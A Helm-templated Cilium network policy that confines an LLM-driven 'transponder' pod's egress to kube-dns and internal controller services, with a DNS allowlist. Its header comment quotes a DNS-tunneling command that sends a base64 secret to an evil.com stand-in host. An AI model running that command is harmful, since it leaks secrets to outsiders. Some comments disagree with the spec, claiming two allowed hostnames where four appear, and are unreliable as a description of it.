# Transponder egress envelope. The transponder is semi-adversarial
# (it interprets LLM-driven streams); the mainframe-runtime
# sidecar is gone, and ALL tool execution (stdlib and tenant-defined
# alike) flows through airlock-controller. This CNP is the SOLE
# transponder egress policy — it owns both L4 destinations (kube-dns,
# hangar-ctrl, airlock-ctrl) AND the L7 DNS allowlist on kube-dns.
# Default-deny otherwise.
#
# Why a single CNP and not a K8s NetworkPolicy alongside: Cilium's
# documented "L4 shadows L7" merge semantics
# (https://docs.cilium.io/en/stable/security/policy/layer7/) cause a
# K8s NP that allows kube-dns:53 with no L7 rule to silently nullify
# any sibling CNP's L7 DNS allowlist. The proxy redirects the flow but
# evaluates the union ruleset as permissive. Empirically verified on
# Cilium 1.19.3.
#
# The L7 allowlist closes the DNS-tunneling exfil vector: without it, a
# workspace can `dig <base64-secret>.evil.com @kube-dns` and leak data
# through the resolver chain even with no external IP egress reachable.
# Only the two controller hostnames are forwarded; all other DNS
# queries drop at the Cilium L7 proxy before reaching kube-dns.
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: transponder-egress
  namespace: {{ .Release.Namespace }}
  labels:
    {{- include "sycophant.labels" . | nindent 4 }}
spec:
  endpointSelector:
    matchLabels:
      app.kubernetes.io/component: transponder
      app.kubernetes.io/part-of: sycophant
  egress:
    - toEndpoints:
        - matchLabels:
            io.kubernetes.pod.namespace: kube-system
            k8s-app: kube-dns
      toPorts:
        - ports:
            - port: "53"
              protocol: UDP
            - port: "53"
              protocol: TCP
          rules:
            dns:
              - matchName: "hangar-ctrl.{{ .Release.Namespace }}.svc.cluster.local"
              - matchName: "airlock-ctrl.{{ .Release.Namespace }}.svc.cluster.local"
              - matchName: "mainframe-ctrl.{{ .Release.Namespace }}.svc.cluster.local"
              - matchName: "relay-ctrl.{{ .Release.Namespace }}.svc.cluster.local"
    - toEndpoints:
        - matchLabels:
            app.kubernetes.io/name: hangar-ctrl
            app.kubernetes.io/part-of: sycophant
      toPorts:
        - ports:
            - port: "9090"
              protocol: TCP
    - toEndpoints:
        - matchLabels:
            app.kubernetes.io/name: airlock-ctrl
            app.kubernetes.io/part-of: sycophant
      toPorts:
        - ports:
            - port: "9090"
              protocol: TCP
    - toEndpoints:
        - matchLabels:
            app.kubernetes.io/name: mainframe-ctrl
            app.kubernetes.io/part-of: sycophant
      toPorts:
        - ports:
            - port: "9090"
              protocol: TCP
    # relay gateway: the transponder dials Subscribe (inbound user
    # messages) and, from Stage 4, DeliverOutbound (reply + turn-state).
    - toEndpoints:
        - matchLabels:
            app.kubernetes.io/name: relay-ctrl
            app.kubernetes.io/part-of: sycophant
      toPorts:
        - ports:
            - port: "9090"
              protocol: TCP
  # Ingress: allow the relay gateway to forward external WatchTools /
  # CallTool requests into the per-workspace transponder. Workspace
  # filtering happens at the application layer via the caller's signed
  # envelope and the channel-binding check; CNP is the L4 backstop.
  ingress:
    - fromEndpoints:
        - matchLabels:
            app.kubernetes.io/name: relay-ctrl
            app.kubernetes.io/part-of: sycophant
      toPorts:
        - ports:
            - port: "9090"
              protocol: TCP
